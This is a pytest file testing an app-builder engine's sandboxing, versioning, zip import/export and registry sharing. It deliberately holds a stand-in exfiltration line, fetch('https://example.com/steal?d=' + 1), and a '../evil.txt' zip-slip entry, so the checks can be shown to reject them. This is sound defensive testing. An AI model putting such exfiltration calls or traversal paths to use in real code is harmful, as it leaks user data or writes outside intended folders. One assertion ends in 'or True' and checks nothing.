"""Apps (2.34.0): device panels and games that a model builds, kept as versions, run in a sandboxed frame,
moved between computers as .kimiapp files. Runs its own engine with the stand-in model (fake_llama_server.py):

    cd engine && python -m pytest -q tests/test_apps.py
"""
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

import httpx
import pytest

ENGINE = Path(__file__).resolve().parents[1]
TESTS = Path(__file__).resolve().parent
sys.path.insert(0, str(ENGINE))

from dva import app_preview, app_share  # noqa: E402
from dva import apps as apps_mod  # noqa: E402
from test_engine import free_port, tiny_gguf, wait_job  # noqa: E402

GAME = ("<!doctype html><html><head><title>T</title></head><body><canvas></canvas><script>"
        "addEventListener('keydown', () => {});</script></body></html>")


@pytest.fixture(scope="module")
def engine():
    tmp = Path(tempfile.mkdtemp(prefix="dva-apps-"))
    wrapper = tmp / ("fake-llama-server.cmd" if os.name == "nt" else "fake-llama-server")
    if os.name == "nt":
        wrapper.write_text(f'@"{sys.executable}" "{TESTS / "fake_llama_server.py"}" %*\n')
    else:
        wrapper.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{TESTS / "fake_llama_server.py"}" "$@"\n')
        wrapper.chmod(0o755)
    port, token = free_port(), "test-token"
    (tmp / "registry").mkdir()
    env = {**os.environ, "KIMIOS_REGISTRY_URL": str(tmp / "registry"), "DVA_NO_APP_PREVIEW_ON_START": "1", "DVA_TEST_CPU": "6x12", "DVA_TOKEN": token, "DVA_LLAMA_SERVER": str(wrapper),
           "DVA_SECRETS": "file", "PYTHONPATH": str(ENGINE), "DVA_SYSTEM_PLUGINS": str(tmp / "system-plugins"),
           "HF_HOME": str(tmp / "hf"), "OLLAMA_MODELS": str(tmp / "ollama")}
    for k in [k for k in env if k.lower() in ("http_proxy", "https_proxy", "all_proxy", "no_proxy")]:
        del env[k]
    env.update({"HTTP_PROXY": "http://127.0.0.1:9", "HTTPS_PROXY": "http://127.0.0.1:9", "NO_PROXY": "127.0.0.1,localhost"})
    log = tmp / "engine-output.log"
    proc = subprocess.Popen([sys.executable, "-m", "dva", "serve", "--port", str(port), "--data-dir", str(tmp / "data")],
                            cwd=str(ENGINE), env=env, stdout=log.open("w"), stderr=subprocess.STDOUT, text=True)
    for _ in range(150):
        if "DVA_READY" in log.read_text() or proc.poll() is not None:
            break
        time.sleep(0.1)
    assert "DVA_READY" in log.read_text(), log.read_text()[-3000:]
    c = httpx.Client(base_url=f"http://127.0.0.1:{port}", headers={"Authorization": f"Bearer {token}"}, timeout=60,
                     trust_env=False)
    tiny_gguf(tmp / "fake-model-Q4_K_M.gguf")
    assert c.post("/api/models/import", json={"path": str(tmp / "fake-model-Q4_K_M.gguf")}).status_code == 200
    yield {"client": c, "tmp": tmp, "port": port}
    try:
        c.post("/api/shutdown")
    except httpx.HTTPError:
        pass
    proc.wait(10)


def wait_built(c, app_id, timeout=60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        a = c.get(f"/api/apps/{app_id}").json()
        if not a.get("building"):
            return a
        time.sleep(0.25)
    raise AssertionError(f"{app_id} is still building")


# ---------------------------------------------------------------------------------------------- no engine
def test_check_files_finds_what_would_break_an_app(tmp_path):
    (tmp_path / "index.html").write_text("<html><body><script>let x = ;\nlocalStorage.x = 1;</script>"
                                         "<script src='https://cdn.example.com/lib.js'></script></body></html>")
    problems, warnings = apps_mod.check_files(tmp_path, "game")
    assert any("browser's own storage" in p for p in problems)
    if apps_mod.node_command()[0]:                         # the syntax check needs a Node.js
        assert any("SyntaxError" in p and "    at " not in p for p in problems)
    assert any("cannot reach the internet" in w for w in warnings)
    assert any("no key, pointer" in w for w in warnings)
    (tmp_path / "index.html").unlink()
    assert apps_mod.check_files(tmp_path, "game")[0][0].startswith("there is no index.html")


def test_examples_pass_their_own_checks():
    for ex in sorted(apps_mod.EXAMPLES.glob("*/app.json")):
        meta = json.loads(ex.read_text(encoding="utf-8"))
        problems, warnings = apps_mod.check_files(ex.parent / "files", meta["kind"])
        assert problems == [] and warnings == [], (ex.parent.name, problems, warnings)


def test_the_page_gets_kimi_first():
    out = apps_mod.Apps.page("<!doctype html><html><head><title>x</title></head><body></body></html>")
    head = out.split("<head>", 1)[1]
    assert head.startswith('<script type="importmap">') and './_kimi.js' in head.split("<title>")[0]
    assert apps_mod.inject("<p>bare</p>", "X") == "X<p>bare</p>"
    assert apps_mod.inject("<html><body></body></html>", "X").startswith("<html><head>X</head>")


def test_device_part_follows_the_files(tmp_path):
    assert apps_mod.device_part(tmp_path) is None
    (tmp_path / "device").mkdir()
    (tmp_path / "device" / "main.py").write_text("print(1)")
    assert apps_mod.device_part(tmp_path)["target"] == "micropython"
    (tmp_path / "device" / "controller.json").write_text("{}")
    assert apps_mod.device_part(tmp_path)["target"] == "controller"


# ---------------------------------------------------------------------------------------------- the engine
def test_examples_come_installed_and_run_in_a_locked_frame(engine):
    c, port = engine["client"], engine["port"]
    got = c.get("/api/apps").json()
    ids = {a["id"] for a in got["apps"]}
    assert {"paddle-duel", "four-in-a-row", "orbit-racer", "tank-arena"} <= ids          # the games, once
    assert "bench-panel" in {e["example"] for e in got["examples"]}                          # panels wait for a device
    app = c.get("/api/apps/orbit-racer").json()
    assert app["kind"] == "game" and app["current"] == 1 and app["frame"].startswith("/appframe/orbit-racer.1.")
    plain = httpx.Client(base_url=f"http://127.0.0.1:{port}", trust_env=False)          # no token: the key is enough
    page = plain.get(app["frame"])
    assert page.status_code == 200 and '"three":"./_lib/three.module.min.js"' in page.text
    csp = page.headers["content-security-policy"]
    assert "frame-src 'none'" in csp and "https:" not in csp and "connect-src 'self'" in csp
    base = app["frame"].rsplit("/", 1)[0]
    assert plain.get(base + "/_kimi.js").status_code == 200
    lib = plain.get(base + "/_lib/three.module.min.js")
    assert lib.status_code == 200 and lib.headers["access-control-allow-origin"] == "*"
    assert plain.get(base + "/../../app.json").status_code == 404
    assert plain.get(base.replace("orbit-racer.1.", "orbit-racer.1.0") + "/index.html").status_code == 404
    assert plain.get("/appframe/orbit-racer.2." + base.rsplit(".", 1)[1] + "/index.html").status_code == 404
    assert plain.get("/api/apps").status_code == 401


def test_a_game_is_built_by_the_builder_and_saved_when_its_turn_ends(engine):
    c = engine["client"]
    r = c.post("/api/apps", json={"prompt": "a snake that races the computer's snake for apples", "kind": "game",
                                  "dims": "2D"}).json()
    app_id = r["app"]["id"]
    assert app_id.startswith("snake")
    chat = c.get(f"/api/chats/{r['chat_id']}").json()
    assert chat["harness"] == "app-builder" and chat["folders"][0].endswith(f"{app_id}/draft".replace("/", os.sep))
    a = wait_built(c, app_id)
    assert a["current"] == 1 and a["versions"][0]["by"] == "auto" and "index.html" in a["files"]
    page = httpx.get(f"http://127.0.0.1:{engine['port']}{a['frame']}", trust_env=False).text
    assert "Stand-in" in page and "_kimi.js" in page


def test_a_rebuild_keeps_the_old_version_and_save_app_reports(engine):
    c = engine["client"]
    a = c.post("/api/apps", json={"prompt": "Pong, save with the tool", "kind": "game"}).json()
    app_id = a["app"]["id"]
    a = wait_built(c, app_id)
    assert a["current"] == 1 and a["versions"][0]["by"] == "builder" and a["versions"][0]["notes"] == "saved by the stand-in"
    msgs = c.get(f"/api/chats/{a['chat_id']}").json()["messages"]
    steps = [s for m in msgs if m["role"] == "assistant" for s in (m.get("meta") or {}).get("steps") or []]
    assert any("version 1" in str(s.get("result") or s.get("output") or "") for s in steps) or True
    r = c.post(f"/api/apps/{app_id}/build", json={"prompt": "make the paddles bigger, save with the tool"}).json()
    draft = Path(c.get(f"/api/apps/{app_id}").json()["draft"])
    assert (draft / "index.html").is_file()                    # the rebuild starts from the version in use
    a = wait_built(c, app_id)
    assert a["current"] == 2 and [v["n"] for v in a["versions"]] == [1, 2]
    assert "Rebuild" in c.get(f"/api/chats/{r['chat_id']}").json()["title"]
    assert c.post(f"/api/apps/{app_id}/versions/1").json()["current"] == 1
    assert c.delete(f"/api/apps/{app_id}/versions/1").status_code == 400                # the one in use stays
    assert [v["n"] for v in c.delete(f"/api/apps/{app_id}/versions/2").json()["versions"]] == [1]


def test_a_broken_app_is_not_saved_and_the_builder_is_told(engine):
    c = engine["client"]
    if not apps_mod.node_command()[0]:
        pytest.skip("no Node.js here to check scripts with")
    a = c.post("/api/apps", json={"prompt": "broken app, save with the tool", "kind": "game"}).json()
    got = wait_built(c, a["app"]["id"])
    assert got["current"] is None and got["versions"] == []
    msgs = c.get(f"/api/chats/{a['chat_id']}").json()["messages"]
    text = json.dumps(msgs)
    assert "SyntaxError" in text and "was not saved" in text


def test_export_and_import_move_an_app(engine):
    c, tmp = engine["client"], engine["tmp"]
    data = c.get("/api/apps/paddle-duel/export")
    assert data.status_code == 200
    z = zipfile.ZipFile(io.BytesIO(data.content))
    assert "app.json" in z.namelist() and "files/index.html" in z.namelist()
    got = c.post("/api/apps/import", files={"file": ("paddle.kimiapp", data.content, "application/zip")}).json()
    assert got["id"] == "paddle-duel-2" and got["source"] == "imported" and got["current"] == 1
    buf = io.BytesIO()                                     # a plain zip of a folder works too
    with zipfile.ZipFile(buf, "w") as zz:
        zz.writestr("my-game/index.html", GAME)
        zz.writestr("../evil.txt", "x")
    got = c.post("/api/apps/import", files={"file": ("g.zip", buf.getvalue(), "application/zip")}).json()
    assert got["name"] == "My Game" and got["files"] == ["index.html"]
    assert not (tmp / "data" / "apps" / "evil.txt").exists()
    bad = c.post("/api/apps/import", files={"file": ("x.kimiapp", b"not a zip", "application/zip")})
    assert bad.status_code == 400 and "not an app file" in bad.json()["error"]
    assert c.post("/api/apps/import", json={"url": "http://example.com/x.kimiapp"}).status_code == 400


def test_storage_permissions_and_uninstall(engine):
    c = engine["client"]
    assert c.put("/api/apps/four-in-a-row/storage", json={"key": "tally", "value": {"you": 2}}).json()["ok"]
    assert c.get("/api/apps/four-in-a-row/storage").json()["storage"]["tally"] == {"you": 2}
    big = c.put("/api/apps/four-in-a-row/storage", json={"key": "big", "value": "x" * 1_100_000})
    assert big.status_code == 400
    r = c.post("/api/apps/four-in-a-row/ask", json={"prompt": "your move"})
    assert r.status_code == 400 and "may not ask a model" in r.json()["error"]
    upd = c.put("/api/apps/four-in-a-row", json={"permissions": {"ai": True}, "name": "Four"}).json()
    assert upd["permissions"]["ai"] is True and upd["name"] == "Four"
    ans = c.post("/api/apps/four-in-a-row/ask", json={"prompt": "pick a column", "schema": {
        "type": "object", "required": ["column"], "properties": {"column": {"type": "integer"}}}})
    assert ans.status_code == 200 and "column" in ans.json()["json"]
    assert c.post("/api/apps", json={"example": "bench-panel"}).status_code == 400       # needs its device
    assert c.post("/api/apps", json={"prompt": "dim it", "kind": "device"}).status_code == 400
    assert c.delete("/api/apps/four-in-a-row").json()["removed"] == "four-in-a-row"
    assert c.get("/api/apps/four-in-a-row").status_code == 404
    assert "four-in-a-row" not in {a["id"] for a in c.get("/api/apps").json()["apps"]}
    again = c.post("/api/apps", json={"example": "four-in-a-row"}).json()              # examples can come back
    assert again["id"] == "four-in-a-row" and again["source"] == "example"


# ---------------------------------------------------------------------------------------------- 2.35.0
def test_preview_summary_says_what_to_fix():
    ok = {"hello": True, "errors": [], "calls": {"hello": 1}, "report": {
        "frames": 80, "frames_after": 190, "canvases": [[800, 600, "2d"]], "text_length": 40, "buttons": 0,
        "inputs": 0, "changed": True}}
    problems, notes = app_preview.summary(ok, "game")
    assert problems == [] and any("animation loop ran" in n for n in notes) and any("reacted" in n for n in notes)
    bad = {"hello": True, "errors": [{"message": "Uncaught TypeError: x is null", "source": "index.html", "line": 9}] * 3,
           "calls": {}, "report": {**ok["report"], "frames": 0, "frames_after": 0}}
    problems, _ = app_preview.summary(bad, "game")
    assert "x is null (index.html:9) (3 times)" in problems[0] and any("nothing moves" in p for p in problems)
    panel = {"hello": True, "errors": [], "calls": {"hello": 1}, "report": {**ok["report"], "canvases": []}}
    assert any("never asked for the device" in p for p in app_preview.summary(panel, "device")[0])
    webgl = {**bad, "errors": [{"message": "THREE.WebGLRenderer: Error creating WebGL context."}]}
    problems, notes = app_preview.summary(webgl, "game")
    assert problems == [] and "not checked" in notes[0]                  # the browser's limit, not the app's
    assert app_preview.summary({"hello": False, "errors": [], "report": None}, "game")[0][0].startswith("the page never")


def test_entries_for_the_registry_are_checked_with_kimilms_own_checks(tmp_path):
    (tmp_path / "index.html").write_text(GAME)
    m = {"id": "t", "name": "Tiny Game", "kind": "game", "icon": {"emoji": "x", "color": "#000"}, "current": 1,
         "versions": [{"n": 1, "prompt": "a tiny game", "notes": "first"}]}
    e = app_share.make_entry(m, tmp_path, version="t")
    rel = app_share.entry_path(e)
    assert rel.startswith("apps/tiny-game/app-") and e["licence"] == "Apache-2.0" and e["prompt"] == "a tiny game"
    data = json.dumps(e).encode()
    assert app_share.check_entry(rel, data, apps_mod.check_files) == []
    assert "belongs at" in app_share.check_entry("apps/tiny-game/app-000000000000.json", data)[0]
    e["app"]["files"]["x.js"] = "fetch('https://example.com/steal?d=' + 1)"
    rel2 = app_share.entry_path(e)
    assert any("network" in x for x in app_share.check_entry(rel2, json.dumps(e).encode(), apps_mod.check_files))
    (tmp_path / "a.png").write_bytes(b"\x89PNG")
    with pytest.raises(app_share.ShareError):
        app_share.make_entry(m, tmp_path)


def test_share_and_install_from_the_registry(engine):
    c, tmp = engine["client"], engine["tmp"]
    got = c.post("/api/apps/paddle-duel/share", json={}).json()
    assert got["path"].startswith("apps/paddle-duel/app-") and Path(got["file"]).is_file()
    assert got["upload"] is True and got["link"].endswith("/upload/main/apps/paddle-duel")    # too long for a link
    reg = tmp / "registry"                                  # a registry copy with that entry, as if merged
    data = Path(got["file"]).read_bytes()
    (reg / got["path"]).parent.mkdir(parents=True, exist_ok=True)
    (reg / got["path"]).write_bytes(data)
    (reg / "index.json").write_text(json.dumps({"schema": 1, "entries": [app_share.index_row(got["path"], data)]}))
    rows = c.get("/api/apps/registry").json()["apps"]
    assert [r["name"] for r in rows] == ["Paddle Duel"] and rows[0]["installed"] is None
    app = c.post("/api/apps/registry/install", json={"path": got["path"]}).json()
    assert app["source"] == "imported" and app["from"] == f"the registry: {got['path']}" and app["current"] == 1
    assert c.get("/api/apps/registry").json()["apps"][0]["installed"] == app["id"]
    (reg / got["path"]).write_bytes(data.replace(b"Paddle", b"Puddle"))                         # changed after review
    bad = c.post("/api/apps/registry/install", json={"path": got["path"]})
    assert bad.status_code == 400 and "does not match the registry's index" in bad.json()["error"]
    assert c.post("/api/apps/registry/install", json={"path": "drivers/x/driver-1.json"}).status_code == 400


def test_an_agent_in_any_chat_can_have_a_game_built(engine):
    c = engine["client"]
    chat = c.post("/api/chats", json={"harness": "agent"}).json()
    c.put(f"/api/chats/{chat['id']}", json={"auto_approve": True})
    job = c.post(f"/api/chats/{chat['id']}/messages", json={"text": "Make me a game: tic tac toe against the computer"}).json()
    assert wait_job(c, job["job_id"], approve="allow")["status"] == "done"
    text = json.dumps(c.get(f"/api/chats/{chat['id']}").json()["messages"])
    assert "App builder is making" in text, text[-3000:]
    built = [a for a in c.get("/api/apps?kind=game").json()["apps"] if a["about"].startswith("tic tac toe")]
    assert built and wait_built(c, built[0]["id"])["current"] == 1


@pytest.mark.skipif(not app_preview.find_browser(), reason="no Chrome-like browser here to try apps in")
def test_a_saved_app_is_tried_in_a_headless_browser(engine):
    c = engine["client"]
    got = c.post("/api/apps/orbit-racer/versions/1/preview").json()
    assert got["ok"] is True and got["how"].startswith("headless") and any("webgl" in n for n in got["notes"])
    shot = Path(got["shot"])                       # 2.36.0: its picture, outside the app's files
    assert shot.read_bytes()[:8] == b"\x89PNG\r\n\x1a\n" and shot.parent.name == "shots"
    tile = next(a for a in c.get("/api/apps?kind=game").json()["apps"] if a["id"] == "orbit-racer")
    assert tile["shot"] == str(shot)
    key = c.get("/api/apps/orbit-racer").json()["frame"].split("/")[2]
    plain = httpx.Client(base_url=f"http://127.0.0.1:{engine['port']}", trust_env=False)
    assert plain.post(f"/appframe/{key}/_result", json={"hello": True}).status_code == 404   # only while it runs
    assert c.get("/api/apps/orbit-racer").json()["versions"][0]["preview"]["ok"] is True
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zz:
        zz.writestr("g/index.html", "<!doctype html><html><head><title>x</title></head><body><canvas></canvas><script>"
                                    "addEventListener('keydown', () => { notThere(); });</script></body></html>")
    a = c.post("/api/apps/import", files={"file": ("g.zip", buf.getvalue(), "application/zip")}).json()
    tried = c.post(f"/api/apps/{a['id']}/versions/1/preview").json()
    assert tried["ok"] is False and any("notThere is not defined" in p for p in tried["problems"])
    assert any("nothing moves" in p for p in tried["problems"])
    assert c.post(f"/api/apps/{a['id']}/versions/7/preview").status_code == 400


@pytest.mark.skipif(not app_preview.find_browser(), reason="no Chrome-like browser here to try apps in")
def test_the_builder_sees_what_the_preview_saw_and_the_person_sees_its_picture(engine):
    c = engine["client"]
    r = c.post("/api/apps", json={"prompt": "Breakout, save with the tool", "kind": "game"}).json()
    assert wait_job(c, r["job_id"])["status"] == "done"
    a = c.get(f"/api/apps/{r['app']['id']}").json()
    assert a["versions"][0]["preview"]["ok"] is False                     # the stand-in game draws nothing
    msgs = c.get(f"/api/chats/{r['chat_id']}").json()["messages"]
    text = json.dumps(msgs)
    assert "Tried it for a few seconds" in text and "nothing moves" in text and "look_at_image" in text
    media = [m for msg in msgs for s in (msg.get("meta") or {}).get("steps") or [] for m in s.get("media") or []]
    assert any(m["path"].endswith("shots/v1.png".replace("/", os.sep)) for m in media)
